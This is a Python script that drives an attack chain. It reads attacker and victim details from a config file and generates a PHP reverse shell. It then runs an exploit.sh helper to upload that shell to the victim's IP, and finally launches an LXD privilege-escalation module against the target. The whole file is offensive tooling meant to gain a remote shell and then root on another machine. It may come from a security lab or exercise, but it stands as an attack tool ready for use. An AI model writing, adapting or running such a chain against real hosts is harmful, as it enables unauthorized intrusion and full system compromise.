import create_conf
import os
import sys
import requests
import errno
import socket
import my_reverse_shell
from datetime import datetime
from configparser import ConfigParser 	

if os.geteuid() != 0:
		exit("[-] You need root privileges to run this script")	  	  
	
def launch_exploit(attacker_info, victim_info):
	now = datetime.now()

	os.system('''bash exploit.sh -u {ip} -f {path}'''.format(ip = victim_info["ip"], path = ( os.getcwd() + '/reverse_shell.php')))

	print("[*] Checking if url was generated")

	
		

	
def main():

	flag = False

	config_object = ConfigParser()

	print('[+] Executing exploit...')
	print('[?] Do you wish to continue? (y|n)')
	ans = input()

	if not ans:
		sys.exit()

	if os.path.exists('./config.ini'):			  
		print('[+] Config file detected')
		print('[?] Do you wish to modify the configuration file? (y|n)')
		ans = input()
		if(ans == 'y' or ans == 'Y'):
			flag = True
	else:
		create_conf.gen_config()
	if flag:
		create_conf.gen_config()
		
	while not os.path.exists('./config.ini'): # Wait while file is saved
		pass
	
	config_object.read("config.ini")
	attacker_info = config_object["ATTACKERINFO"]
	victim_info = config_object["VICTIMINFO"]

	f = open("reverse_shell.php", "w")

	code = my_reverse_shell.gen_reverse_shell(attacker_info)

	f.write(code)

	f.close()

	print('[+] Reverse Shell generated')

	flag = False

		

	print('[*] Executing exploit')
	
	print('[*] Sending the payload...')
	launch_exploit(attacker_info, victim_info)
	user_dir = os.getcwd()
	print('[*] Proceeding to execute the reverse shell')
	os.system("python3 {dir}/Privilege_Escalation_LXD/main.py {ip} {port} {v_ip} {v_port}".format(dir = user_dir, ip = attacker_info["ip"], port = attacker_info["port"], v_ip = victim_info['ip'], v_port = victim_info['port']))

if __name__ == '__main__':
	main()
